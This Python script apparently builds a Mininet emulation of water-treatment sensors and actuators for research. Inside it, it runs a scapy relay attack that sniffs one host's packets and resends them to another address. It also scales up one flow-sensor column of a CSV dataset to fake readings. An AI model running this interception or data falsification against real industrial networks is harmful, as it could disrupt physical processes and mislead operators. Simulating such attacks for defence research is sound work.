import sys
from mininet.net import Mininet
from mininet.node import OVSSwitch, RemoteController
from mininet.cli import CLI
import pandas as pd
from scapy.all import *

def relay_attack(target_ip, relay_ip, duration):
    packets = sniff(filter=f"host {target_ip}", timeout=duration)
    for packet in packets:
        packet[IP].dst = relay_ip
        send(packet, verbose=0)

def create_topology(dataset_path):
    net = Mininet(controller=None, switch=OVSSwitch)
    s1 = net.addSwitch('s1')

    sensors = ['FIT101', 'LIT101', 'AIT201', 'AIT202', 'AIT203', 'FIT201', 'FIT301', 'LIT301', 'AIT401', 'AIT402']
    actuators = ['MV101', 'P101', 'P102', 'MV201', 'P201', 'P202', 'P203', 'P204', 'P205', 'P206', 'MV301', 'MV302', 'MV303', 'MV304', 'P301', 'P302', 'P401', 'P402', 'P403', 'P404']

    for sensor in sensors:
        net.addHost(sensor)
    for actuator in actuators:
        net.addHost(actuator)

    for sensor in sensors:
        net.addLink(sensor, s1)
    for actuator in actuators:
        net.addLink(actuator, s1)

    net.start()

    c0 = net.addController('c0', controller=RemoteController, ip='127.0.0.1', port=6633)
    c0.start()
    s1.start([c0])

    target_ip = "10.0.0.1"
    relay_ip = "10.0.0.2"
    duration = 15

    print(f"Starting relay attack: Intercepting packets from {target_ip} and relaying them to {relay_ip} for {duration} seconds...")
    relay_attack(target_ip, relay_ip, duration)
    print("Relay attack completed.")

    dataset = pd.read_csv(dataset_path, skiprows=1)
    dataset.columns = ['Timestamp', 'FIT101', 'LIT101', 'MV101', 'P101', 'P102', 'AIT201', 'AIT202', 'AIT203',
                       'FIT201', 'MV201', 'P201', 'P202', 'P203', 'P204', 'P205', 'P206', 'DPIT301', 'FIT301',
                       'LIT301', 'MV301', 'MV302', 'MV303', 'MV304', 'P301', 'P302', 'AIT401', 'AIT402', 'FIT401',
                       'LIT401', 'P401', 'P402', 'P403', 'P404', 'UV401', 'AIT501', 'AIT502', 'AIT503', 'AIT504',
                       'FIT501', 'FIT502', 'FIT503', 'FIT504', 'P501', 'P502', 'PIT501', 'PIT502', 'PIT503',
                       'FIT601', 'P601', 'P602', 'P603', 'Normal/Attack']

    dataset.loc[dataset['FIT101'] > 0, 'FIT101'] *= 1.1

    modified_file_path = 'modified_' + dataset_path.split('/')[-1]
    dataset.to_csv(modified_file_path, index=False)
    print(f"Modified dataset saved to {modified_file_path}")

    CLI(net)
    net.stop()

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python mininet_topology.py <dataset_file_path>")
        sys.exit(1)

    create_topology(sys.argv[1])